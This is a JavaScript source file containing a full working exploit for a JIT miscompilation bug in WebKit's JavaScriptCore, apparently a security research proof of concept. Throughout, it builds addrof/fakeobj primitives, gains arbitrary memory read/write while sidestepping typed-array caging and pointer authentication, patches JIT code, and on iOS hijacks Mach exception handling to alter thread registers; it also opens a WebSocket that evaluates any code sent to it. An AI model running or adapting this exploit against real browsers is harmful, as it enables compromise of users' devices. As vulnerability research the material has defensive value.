import {IN_BROWSER, IN_SHELL, IS_IOS, NUM_REGS} from './env.js';
import {hexdump, assert, Int64, Add, Sub, And} from './utils.js';
import {log} from './logging.js';
import {offsets} from './offsets.js';
import {waitFor, ready} from './ready.js';

// This is an upper limit on the number of iterations. Functions
// that need to be JITed will attempt to detect when they
// have been compiled, then break out of the compilation loop.
const ITERATIONS = 10000000;
const DEBUG = IN_SHELL

function hax(arr, n) {
    // Force n to be a 32bit integer.
    n |= 0;

    // Let IntegerRangeOptimization know that n will be a negative number inside the body.
    if (n < 0) {
        // Force "non-number bytecode usage" so the negation becomes unchecked and as such
        // INT_MIN will again become INT_MIN in the last iteration.
        let v = (-n)|0;

        // As n is known to be negative here, this ArithAbs will become a ArithNegate.
        // That negation will be checked, but then be CSE'd for the previous, unchecked one.
        // This is the compiler bug.
        let i = Math.abs(n);

        // However, IntegerRangeOptimization has also marked i as being >= 0...

        if (i < arr.length) {
            // .. so here IntegerRangeOptimization now believes i will be in the range [0, arr.length)
            // while i will actually be INT_MIN in the final iteration.

            // This condition is written this way so integer range optimization isn't
            // able to propagate range information (in particular that i must be a negative integer)
            // into the body.
            if (i & 0x80000000) {
                // In the last iteration, this will turn INT_MIN into an arbitrary,
                // positive number since the ArithAdd has been made unchecked by
                // integer range optimization (as it believes i to be a positive number)
                // and so doesn't bail out when overflowing int32.
                i += -0x7ffffff9;
            }

            // This condition is necessary due to the subtraction above.
            if (i > 0) {
                // In here, IntegerRangeOptimization again believes i to be in the range [0, arr.length)
                // and thus eliminates the CheckBounds node, leading to a controlled OOB access.
                // This write will the corrupt the header of the following JSArray, setting its
                // length and capacity to 0x1337.
                arr[i] = 1.04380972981885e-310;
            }
        }
    }
}

// Setup the well-known low-level exploit primitives.
function setup_addrof_fakeobj() {
    // Must have at least one non-literal in the array literals below to avoid CopyOnWrite arrays.
    let noCoW = 13.37;

    // Fill any existing holes in the heap.
    let spray = [];
    for (let i = 0; i < 10000; i++) {
        let arr = [noCoW, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6];
        spray.push(arr);
    }

    // The butterflies of these three arrays should be placed immediately after each other
    // in memory. We will corrupt the length of float_arr by OOB writing into target. Afterwards,
    // we can do easy double <-> JSValue type confusions.
    let target = [noCoW, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6];
    let float_arr = [noCoW, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6];
    let obj_arr = [{}, {}, {}, {}, {}, {}, {}];

    // Force JIT (mis)compilation and exploit the bug to corrupt the length of float_arr.
    //
    // Note: to make this even more reliable, exploit the bug for an OOB read first
    // and read some markers (i.e. some unique integer values) from the following
    // two arrays to be sure that we got the right heap layout
    // (i.e. target directly followed by float_arr directly followed by obj_arr).
    for (let i = 1; i <= ITERATIONS; i++) {
        let n = -4;
        if (i % 10000 == 0) {
            n = -2147483648;        // INT_MIN
        }
        hax(target, n);
        if (float_arr.length == 0x1337) {
            break;
        }
    }

    if (float_arr.length != 0x1337) {
        throw "Array corruption failed";
    }

    // (OOB) index into float_arr that overlaps with the first element of obj_arr.
    // Index 7 (directly behind the last element) overlaps with the header of the next butterfly.
    const OVERLAP_IDX = 8;

    let addrof = function addrof(obj) {
        obj_arr[0] = obj;
        return float_arr[OVERLAP_IDX];
    }

    let fakeobj = function fakeobj(addr) {
        float_arr[OVERLAP_IDX] = addr;
        return obj_arr[0];
    }

    return [addrof, fakeobj];
}

function setup_rw() {
    log(`[*] Running in ${IN_BROWSER ? "browser" : "shell"} environment`);

    offsets.resolve();

    let [raw_addrof, raw_fakeobj] = setup_addrof_fakeobj();

    // Convenience wrappers to use Int64
    function addrof(obj) {
        return Int64.fromDouble(raw_addrof(obj));
    }
    function fakeobj(addr) {
        return raw_fakeobj(addr.asDouble());
    }

    // Uncomment to crash at 0x414141414141
    //log(addrof({}));
    //log(fakeobj(3.54484805889626e-310));

    // Create a legit, non-CoW float array to copy a JSCell header from.
    let float_arr = [Math.random(), 1.1, 2.2, 3.3, 4.4, 5.5, 6.6];

    // Now fake a JSArray whose butterfly points to an unboxed double JSArray.
    let jscell_header = new Int64([
        0x00, 0x10, 0x00, 0x00,     // m_structureID
        0x7,                        // m_indexingType (ArrayWithDouble)
        0x23,                       // m_type
        0x08,                       // m_flags
        0x1                         // m_cellState
    ]).asDouble();

    let container = {
        jscell_header: jscell_header,
        butterfly: float_arr,
    };

    let container_addr = addrof(container);
    let fake_array_addr = Add(container_addr, 16);
    log("[*] Fake JSArray @ " + fake_array_addr);
    let fake_arr = fakeobj(fake_array_addr);

    // Can now simply read a legitimate JSCell header and use it.
    // However, the op_get_by_val will cache the last seen structure id
    // and use that e.g. during GC. To avoid crashing at that point,
    // we simply execute the op_get_by_val twice.
    let legit_arr = float_arr;
    let results = [];
    for (let i = 0; i < 2; i++) {
        let a = i == 0 ? fake_arr : legit_arr;
        results.push(a[0]);
    }
    jscell_header = results[0];
    container.jscell_header = jscell_header;
    log(`[*] Copied legit JSCell header: ${Int64.fromDouble(jscell_header)}`);

    log("[+] Achieved limited arbitrary read/write \\o/");

    // Uncomment following two lines to crash while attempting to write 0xffff000000001337 to 0x414141414141.
    //fake_arr[1] = 3.54484805889626e-310;      // Corrupt butterfly pointer
    //float_arr[0] = 1337;

    // Exploit should be stable here.
    if (DEBUG) {
        log("[*] Verifying exploit stability...");
        gc();
        log("[*] All stable!");
    }

    // The controller array writes into the memarr array.
    let controller = fake_arr;
    let memarr = float_arr;

    // Primitives to read/write memory as 64bit floating point values.
    function read64(addr) {
        let oldval = controller[1];
        let res;
        let i = 0;
        do {
            controller[1] = addr.asDouble();
            res = memarr[i];
            addr = Sub(addr, 8);
            i += 1;
        } while (res === undefined);
        controller[1] = oldval;
        return Int64.fromDouble(res);
    }

    function write64(addr, val) {
        let oldval = controller[1];
        let res;
        let i = 0;
        do {
            controller[1] = addr.asDouble();
            res = memarr[i];
            addr = Sub(addr, 8);
            i += 1;
        } while (res === undefined);
        memarr[i-1] = val.asDouble();
        controller[1] = oldval;
    }

    // Get ready for memhax to achieve arbitrary memory read/write.
    // Check out the comments in memhax for an explanation of how it works.

    var global = Function('return this')();
    let js_glob_obj_addr = addrof(global);
    log(`[*] JSGlobalObject @ ${js_glob_obj_addr}`);

    let glob_obj_addr = read64(Add(js_glob_obj_addr, offsets.JS_GLOBAL_OBJ_TO_GLOBAL_OBJ));
    log(`[*] GlobalObject @ ${glob_obj_addr}`);

    let vm_addr = read64(Add(glob_obj_addr, offsets.GLOBAL_OBJ_TO_VM));
    log(`[*] VM @ ${vm_addr}`);

    let vm_top_call_frame_addr = Add(vm_addr, offsets.VM_TO_TOP_CALL_FRAME);
    let vm_top_call_frame_addr_dbl = vm_top_call_frame_addr.asDouble();
    log(`[*] VM.topCallFrame @ ${vm_top_call_frame_addr}`);

    let stack_ptr = read64(vm_top_call_frame_addr);
    log(`[*] Top CallFrame (stack) @ ${stack_ptr}`);

    // Must be Int32 so that all possible values can
    // be represented as a JSValue. Otherwise, it might
    // cause unwanted bailouts in memhax.
    let view = new Int32Array(0x1000);
    let view_addr = addrof(view);
    let buf_addr = read64(Add(view_addr, 16));

    // This function achieves arbitrary memory read/write by abusing TypedArrays.
    //
    // In JSC, the typed array backing storage pointers are caged as well as PAC
    // signed. As such, modifying them in memory will either just lead to a crash
    // or only yield access to the primitive Gigagcage region which isn't very useful.
    //
    // This function bypasses that when one already has a limited read/write primitive:
    // 1. Leak a stack pointer
    // 2. Access NUM_REGS+1 typed array so that their uncaged and PAC authenticated backing
    //    storage pointer are loaded into registers via GetIndexedPropertyStorage.
    //    As there are more of these pointers than registers, some of the raw pointers
    //    will be spilled to the stack.
    // 3. Find and modify one of the spilled pointers on the stack
    // 4. Perform a second access to every typed array which will now load and
    //    use the previously spilled (and now corrupted) pointers.
    //
    // It is also possible to implement this using a single typed array and separate
    // code to force spilling of the backing storage pointer to the stack. However,
    // this way it is guaranteed that at least one pointer will be spilled to the
    // stack regardless of how the register allocator works as long as there are
    // more typed arrays than registers.
    //
    // NOTE: This function is only a template, in the final function, every
    // line containing an "$r" will be duplicated NUM_REGS times, with $r
    // replaced with an incrementing number starting from zero.
    //
    const READ = 0, WRITE = 1;
    let memhax_template = function memhax(memviews, operation, address, buffer, length, stack, needle) {
        // See below for the source of these preconditions.
        if (length > memviews[0].length) {
            throw "Memory access too large";
        } else if (memviews.length % 2 !== 1) {
            throw "Need an odd number of TypedArrays";
        }

        // Save old backing storage pointer to restore it afterwards.
        // Otherwise, GC might end up treating the stack as a MarkedBlock.
        let savedPtr = controller[1];

        // Function to get a pointer into the stack, below the current frame.
        // This works by creating a new CallFrame (through a native funcion), which
        // will be just below the CallFrame for the caller function in the stack,
        // then reading VM.topCallFrame which will be a pointer to that CallFrame:
        // https://github.com/WebKit/webkit/blob/e86028b7dfe764ab22b460d150720b00207f9714/
        // Source/JavaScriptCore/runtime/VM.h#L652)
        function getsp() {
            function helper() {
                // This code currently assumes that whatever preceeds topCallFrame in
                // memory is non-zero. This seems to be true on all tested platforms.
                controller[1] = vm_top_call_frame_addr_dbl;
                return memarr[0];
            }
            // DFGByteCodeParser won't inline Math.max with more than 3 arguments
            // https://github.com/WebKit/webkit/blob/e86028b7dfe764ab22b460d150720b00207f9714/
            // Source/JavaScriptCore/dfg/DFGByteCodeParser.cpp#L2244
            // As such, this will force a new CallFrame to be created.
            let sp = Math.max({valueOf: helper}, -1, -2, -3);
            return Int64.fromDouble(sp);
        }

        let sp = getsp();

        // Set the butterfly of the |stack| array to point to the bottom of the current
        // CallFrame, thus allowing us to read/write stack data through it. Our current
        // read/write only works if the value before what butterfly points to is nonzero.
        // As such, we might have to try multiple stack values until we find one that works.
        let tries = 0;
        let stackbase = new Int64(sp);
        let diff = new Int64(8);
        do {
            stackbase.assignAdd(stackbase, diff);
            tries++;
            controller[1] = stackbase.asDouble();
        } while (stack.length < 512 && tries < 64);

        // Load numregs+1 typed arrays into local variables.
        let m$r = memviews[$r];

        // Load, uncage, and untag all array storage pointers.
        // Since we have more than numreg typed arrays, at least one of the
        // raw storage pointers will be spilled to the stack where we'll then
        // corrupt it afterwards.
        m$r[0] = 0;

        // After this point and before the next access to memview we must not
        // have any DFG operations that write Misc (and as such World), i.e could
        // cause a typed array to be detached. Otherwise, the 2nd memview access
        // will reload the backing storage pointer from the typed array.

        // Search for correct offset.
        // One (unlikely) way this function could fail is if the compiler decides
        // to relocate this loop above or below the first/last typed array access.
        // This could easily be prevented by creating artificial data dependencies
        // between the typed array accesses and the loop.
        //
        // If we wanted, we could also cache the offset after we found it once.
        let success = false;
        // stack.length can be a negative number here so fix that with a bitwise and.
        for (let i = 0; i < Math.min(stack.length & 0x7fffffff, 512); i++) {
            // The multiplication below serves two purposes:
            //
            // 1. The GetByVal must have mode "SaneChain" so that it doesn't bail
            //    out when encountering a hole (spilled JSValues on the stack often
            //    look like NaNs): https://github.com/WebKit/webkit/blob/
            //    e86028b7dfe764ab22b460d150720b00207f9714/Source/JavaScriptCore/
            //    dfg/DFGFixupPhase.cpp#L949
            //    webkit/blob/e86028b7dfe764ab22b460d150720b00207f9714/Source/
            //    Doing a multiplication achieves that: https://github.com/WebKit/
            //    JavaScriptCore/dfg/DFGBackwardsPropagationPhase.cpp#L368
            //
            // 2. We don't want |needle| to be the exact memory value. Otherwise,
            //    the JIT code might spill the needle value to the stack as well,
            //    potentially causing this code to find and replace the spilled needle
            //    value instead of the actual buffer address.
            //
            if (stack[i] * 2 === needle) {
                stack[i] = address;
                success = i;
                break;
            }
        }

        // Finally, arbitrary read/write here :)
        if (operation === READ) {
            for (let i = 0; i < length; i++) {
                buffer[i] = 0;
                // We assume an odd number of typed arrays total, so we'll do one
                // read from the corrupted address and an even number of reads
                // from the inout buffer. Thus, XOR gives us the right value.
                // We could also zero out the inout buffer before instead, but
                // this seems nicer :)
                buffer[i] ^= m$r[i];
            }
        } else if (operation === WRITE) {
            for (let i = 0; i < length; i++) {
                m$r[i] = buffer[i];
            }
        }

        // For debugging: can fetch SP here again to verify we didn't bail out in between.
        //let end_sp = getsp();

        controller[1] = savedPtr;

        return {success, sp, stackbase};
    }

    // Add one to the number of registers so that:
    // - it's guaranteed that there are more values than registers (note this is
    //   overly conservative, we'd surely get away with less)
    // - we have an odd number so the XORing logic for READ works correctly
    let nregs = NUM_REGS + 1;

    // Build the real function from the template :>
    // This simply duplicates every line containing the marker nregs times.
    let source = [];
    let template = memhax_template.toString();
    for (let line of template.split('\n')) {
        if (line.includes('$r')) {
            for (let reg = 0; reg < nregs; reg++) {
                source.push(line.replace(/\$r/g, reg.toString()));
            }
        } else {
            source.push(line);
        }
    }
    source = source.join('\n');
    let memhax = eval(`(${source})`);
    //log(memhax);

    // On PAC-capable devices, the backing storage pointer will have a PAC in the
    // top bits which will be removed by GetIndexedPropertyStorage. As such, we are
    // looking for the non-PAC'd address, thus the bitwise AND.
    if (IS_IOS) {
        buf_addr.assignAnd(buf_addr, new Int64('0x0000007fffffffff'));
    }
    // Also, we don't search for the address itself but instead transform it slightly.
    // Otherwise, it could happen that the needle value is spilled onto the stack
    // as well, thus causing the function to corrupt the needle value.
    let needle = buf_addr.asDouble() * 2;

    log(`[*] Constructing arbitrary read/write by abusing TypedArray @ ${buf_addr}`);

    // Buffer to hold input/output data for memhax.
    let inout = new Int32Array(0x1000);

    // This will be the memarr after training.
    let dummy_stack = [1.1, buf_addr.asDouble(), 2.2];

    let views = new Array(nregs).fill(view);

    let lastSp = 0;
    let spChanges = 0;
    for (let i = 0; i < ITERATIONS; i++) {
        let out = memhax(views, READ, 13.37, inout, 4, dummy_stack, needle);
        out = memhax(views, WRITE, 13.37, inout, 4, dummy_stack, needle);
        if (out.sp.asDouble() != lastSp) {
            lastSp = out.sp.asDouble();
            spChanges += 1;
            // It seems we'll see 5 different SP values until the function is FTL compiled
            if (spChanges == 5) {
                break;
            }
        }
    }

    // Now use the real memarr to access stack memory.
    let stack = memarr;

    // An address that's safe to clobber
    let scratch_addr = Add(buf_addr, 42*4);

    // Value to write
    inout[0] = 0x1337;

    for (let i = 0; i < 10; i++) {
        view[42] = 0;

        let out = memhax(views, WRITE, scratch_addr.asDouble(), inout, 1, stack, needle);

        if (view[42] != 0x1337) {
            throw "failed to obtain reliable read/write primitive";
        }
    }

    log(`[+] Got stable arbitrary memory read/write!`);
    if (DEBUG) {
        log("[*] Verifying exploit stability...");
        gc();
        log("[*] All stable!");
    }

    // Views onto the inout buffer with different element types.
    let int32view = inout;
    let float64view = new Float64Array(inout.buffer);
    let uint8view = new Uint8Array(inout.buffer);

    return {
        main_thread_stack: stack_ptr,

        addrof,

        read(addr, length) {
            if (length > 0x4000) {
                throw "Cannot read that much data at once";
            }
            let out = memhax(views, READ, addr.asDouble(), inout, length/4, stack, needle);
            assert(out.success);
            // Make a copy of the data here
            return new Uint8Array(uint8view.subarray(0, length));
        },

        write(addr, data) {
            if (data.length > 0x4000) {
                throw "Cannot write that much data at once";
            }
            let len = Math.floor((data.length+3)/4);
            uint8view.fill(0, len);
            uint8view.set(data);
            let out = memhax(views, WRITE, addr.asDouble(), inout, len, stack, needle);
            assert(out.success);
        },

        readPtr(addr) {
            let out = memhax(views, READ, addr.asDouble(), inout, 2, stack, needle);
            assert(out.success);
            return Int64.fromDouble(float64view[0]);
        },

        writePtr(addr, val) {
            // Use our old primitive for this, it's atomic which is important some times
            write64(addr, val);
        },

        readInt(addr) {
            let out = memhax(views, READ, addr.asDouble(), inout, 2, stack, needle);
            assert(out.success);
            return int32view[0];
        },

        writeInt(addr, val) {
            int32view[0] = val;
            let out = memhax(views, WRITE, addr.asDouble(), inout, 1, stack, needle);
            assert(out.success);
        },
    };
}

async function main() {
    // Need to create and immediately terminate a worker so that exception handlers are installed...
    // See VM::notifyNeedTermination
    let worker = new Worker('empty.js');
    worker.terminate();

    await ready();

    // Declaring it here so it's accessible in the JS shell.
    let memory;

    // Establish JS shell. Doing it here so it has access to module-local variables.
    if (IN_BROWSER) {
        let socket = new WebSocket(`ws://${location.host}/shell`);

        // Context to create "variables" in the shell.
        let ctx = {};

        socket.onmessage = function(evt) {
            try {
                var res = eval(evt.data);
                socket.send(res);
            } catch (e) {
                socket.send(e);
            }
        };
    }

    if (IN_BROWSER) {
        alert("Ready?");
    }

    memory = setup_rw();

    // Basic testing
    //memory.writePtr(scratch_addr, new Int64(0x4141414141));
    //log(memory.readPtr(scratch_addr));

    if (!IS_IOS) {
        let shellcode = hax;
        let funcAddr = memory.addrof(shellcode);
        log("[+] Shellcode function object @ " + funcAddr);
        let executableAddr = memory.readPtr(Add(funcAddr, offsets.JS_FUNCTION_TO_EXECUTABLE));
        log("[+] Executable instance @ " + executableAddr);
        let jitCodeAddr = memory.readPtr(Add(executableAddr, offsets.EXECUTABLE_TO_JITCODE));
        log("[+] JITCode instance @ " + jitCodeAddr);
        let codeAddr = memory.readPtr(Add(jitCodeAddr, offsets.JIT_CODE_TO_ENTRYPOINT));
        log("[+] JITCode @ " + codeAddr);

        memory.write(codeAddr, [0xcc, 0xcc, 0xcc, 0xcc])
        shellcode();
    } else {
        // First, find the JSC module's base address
        let funcAddr = memory.addrof(Math.exp);
        let executableAddr = memory.readPtr(Add(funcAddr, offsets.JS_FUNCTION_TO_EXECUTABLE));
        log("[+] Executable instance @ " + executableAddr);
        let mathExpAddr = memory.readPtr(Add(executableAddr, offsets.EXECUTABLE_TO_NATIVE_FUNC));
        mathExpAddr.assignAnd(mathExpAddr, new Int64('0x0000007fffffffff'));

        let jscBase = Sub(mathExpAddr, offsets.JSC_BASE_TO_MATH_EXP);
        log(`[+] JSC base @ ${jscBase}`);


        // Form a cycle of exception handlers
        let segvHandlerList = Add(jscBase, offsets.JSC_BASE_TO_SEGV_HANDLER);
        let head = memory.readPtr(segvHandlerList);
        memory.writePtr(Add(head, 8), head);
        log(`[*] Exception handler list @ ${segvHandlerList} is now a cycle, segv handler will loop until it is fixed`);

        // Now we need a new worker.
        let worker = new Worker('worker.js');

        worker.onmessage = function(m) {
            if (this.resolve === undefined) {
                log(`Received message from worker: ${m.data}`);
                return;
            }
            this.resolve(m.data);
        };
        worker.onerror = function(e) {
            this.reject('Caught exception in worker: ' + e.message);
        };

        worker.messagePromise = function() {
            if (typeof(this.resolve) !== 'undefined') {
                throw "Cannot have more than one pending message coming from a worker";
            }

            return new Promise(function(resolve, reject) {
                worker.resolve = resolve;
                worker.reject = reject;
            }).finally(() => {
                delete worker.resolve;
                delete worker.reject;
            });
        }

        worker.run = function(code) {
            this.postMessage(code);
            return this.messagePromise();
        };

        worker.ready = function() {
            // The worker posts a message when it is ready.
            return this.messagePromise();
        }

        await worker.ready();

        // Send over the code to re-exploit the vuln in the worker
        // and gain addrof + fakeobj there, which is sufficient since we'll do the reads + writes.
        // This is a bit ugly, but unfortunately module workers are not yet supported.
        await worker.run(`ITERATIONS = ${ITERATIONS};`);
        await worker.run(`hax = ${hax.toString()};`);
        await worker.run(`setup_addrof_fakeobj = ${setup_addrof_fakeobj.toString()};`);
        await worker.run('[addrof, fakeobj] = setup_addrof_fakeobj();');

        let addr = await worker.run('addrof({})');
        if (Number.isNaN(addr)) {
            throw "Failed to set up addrof primitive in worker :(";
        }

        // Whenever a EXC_BAD_ACCESS is raised, a GCD thread will run the exception handler
        // which will spin forever as the linked list of handlers is now a cycle.
        // We then find the stack of that handler by scanning for the return address into
        // __Xmach_exception_raise_state.
        // Then we find the spilled pointer to the OutP mach reply message on the stack
        // and can freely modify it (it contains things like whether the exception was
        // handled and the new register context).
        // Finally, we replace the spilled pointers to OutP on the stack to point to some
        // scratch buffer instead. This is necessary as the _catch_mach_exception_raise_state
        // will return KERN_FAILURE and __Xmach_exception_raise_state writes that value into
        // OutP but we need KERN_SUCCESS there (so the kernel continues the crashed thread).

        // First we need a scratch buffer
        let scratch = new Uint8Array(1024);
        let scratch_addr = memory.addrof(scratch);
        let scratch_buf_addr = memory.readPtr(Add(scratch_addr, 16));
        scratch_buf_addr.assignAnd(scratch_buf_addr, new Int64('0x0000007fffffffff'));
        log(`[+] Scratch buffer @ ${scratch_buf_addr}`);

        // We'll read this value from a corrupted TypedArray later to prove that we can bypass the PAC in TypedArrays
        scratch[0x100] = 42;

        let workerTypedArrayAddr = await worker.run('arr = new Uint8Array(1024*1024); addrof(arr);');
        workerTypedArrayAddr = Int64.fromDouble(workerTypedArrayAddr);
        log(`[*] Worker TypedArray @ ${workerTypedArrayAddr}`);
        let worker_buf_addr = memory.readPtr(Add(workerTypedArrayAddr, 16));
        log(`[*] Worker TypedArray Buffer @ ${worker_buf_addr}`);
        memory.writePtr(Add(workerTypedArrayAddr, 16), new Int64('0x818181818181'));

        // Let the worker access the corrupted typed array, causing a segfault.
        await worker.run('postMessage(42); arr[0];');

        // Next find the stack of the exception handling thread.
        //
        // The thread handling the exception will have its stack somewhere between the main thread's stack (ours)
        // and the worker's stack. So just search that entire region... Do be careful not to run into guard pages though...
        let stack_ptr = memory.main_thread_stack
        let current = And(stack_ptr, new Int64('0xffffffffffffc000'));
        // Jump over the guard page to the next thread's stack
        current = Add(current, 0x8000);

        // Search for the return address into __Xmach_exception_raise_state from _catch_mach_exception_raise_state
        let retAddr = Add(jscBase, offsets.JSC_BASE_TO_CATCH_EXCEPTION_RET_ADDR);
        // Search for the lower 32 bits, since the top bits contain an unknown PAC anyway
        let needle = retAddr.dwords()[0];

        log(`[*] Searching for ${needle} starting at ${current}`);

        let dist = 0;
        let retAddrAddr;
        while (true) {
            log(`[*] Reading ${current} - ${Add(current, 0x4000)}`);
            let buf = memory.read(current, 0x4000);
            let haystack_piece = new Uint32Array(buf.buffer);
            let idx = haystack_piece.indexOf(needle);
            if (idx !== -1) {
                retAddrAddr = Add(current, idx*4);
                break;
            }

            current = Add(current, 0x4000);
            dist += 0x4000;

            // Thread stack size == 0x88000
            if (dist == 0x88000) {
                log(`Skipping guard page @ ${current}`);
                dist = 0;
                current = Add(current, 0x4000);
            }
        }
        log(`[+] Found @ ${retAddrAddr}`);

        // Read the OutP pointer
        let spilled_outp_addr = Sub(retAddrAddr, 0x10);
        let outp_addr = memory.readPtr(spilled_outp_addr);
        log(`[+] OutP @ ${outp_addr}`);

        log(`[*] Register state:\n${hexdump(memory.read(Add(outp_addr, 0x34), 0x108))}`);

        // And replace the spilled OutP on the stack with our scratch buffer (it's there twice)
        memory.writePtr(spilled_outp_addr, scratch_buf_addr);
        memory.writePtr(Sub(spilled_outp_addr, 0x10), scratch_buf_addr);

        // Set RetCode: KERN_SUCCESS
        memory.writeInt(Add(outp_addr, 0x20), 0x0);
        // Set NDR Record
        memory.writePtr(Add(outp_addr, 0x18), new Int64('0x0000000100000000'));
        // Set flavour, ARM_THREAD_STATE
        memory.writeInt(Add(outp_addr, 0x24), 0x1);
        // Set msg_size
        let outStateCount = memory.readInt(Add(outp_addr, 0x28));
        let size = 4 * outStateCount + 44
        memory.writeInt(Add(outp_addr, 4), size);

        function setReg(n, v) {
            let offset = n*8 + 0x34;
            memory.writePtr(Add(outp_addr, offset), v);
        }

        // Fix the backing storage pointer in the TypedArray on the heap
        memory.writePtr(Add(workerTypedArrayAddr, 16), worker_buf_addr);
        // The backing storage pointer is in x3 and x13, so fix both of them
        setReg(3, Add(scratch_buf_addr, 0x100));
        setReg(13, Add(scratch_buf_addr, 0x100));

        log("Fixing exception handlers...");
        memory.writePtr(Add(head, 8), Int64.Zero);

        // Done. The worker should resume and read from scratch[0x100], sending us the value 42 back.
    }
}

main().catch( (e) => log(`[-] Exploit failed: ${e} :(`) );
